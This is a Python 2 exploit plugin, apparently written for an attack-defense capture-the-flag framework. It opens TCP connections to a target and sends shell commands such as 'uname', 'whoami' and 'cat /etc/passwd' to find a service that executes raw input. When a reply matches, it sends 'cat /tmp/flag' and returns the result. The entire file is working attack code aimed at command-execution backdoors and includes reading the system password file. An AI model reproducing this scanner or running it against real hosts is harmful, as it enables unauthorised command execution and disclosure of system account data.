from plugin import plugin
import socket
class exploit(plugin):
    param_count = 0
    timeout = 2
    socket.setdefaulttimeout(timeout) 
    command_list = {'uname':['linux','unix'], 'ls /':["etc"], 'cat /etc/passwd':["root:","/bin"],'whoami':["root:","admin"]}
    def __init__(self,custom_log_dir,args):
        plugin.__init__(self,custom_log_dir,args)
        
    def exp(self):
        if len(self.args) != self.param_count:
            error_msg = "param_count not matched."
            self.log(__name__,error_msg)
            return False,self.host,self.port,self.args,error_msg
        result = ''
        for command in self.command_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))
                sock.send(command)
                result = sock.recv(2048)
                result = result.lower()
                for vuln_str in self.command_list[command]:
                    if vuln_str in result:
                        sock.close()
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((self.host, self.port))
                        sock.send("cat /tmp/flag")
                        result = sock.recv(2048)
                        if result != '':
                            flag = result
                            return True,self.host,self.port,self.args,flag,"exploit success"
                        else:
                            return True,self.host,self.port,self.args,None,"flag not not be there."
            except socket.timeout,e:
                pass
            except Exception, e:
                self.log(__name__,str(e))
            finally:
                sock.close()
        return False,self.host,self.port,self.args,result

    def noexp(self):
        return self._noexp()
        
if __name__ == '__main__':
    print  exploit('./',('127.0.0.1',80)).probe()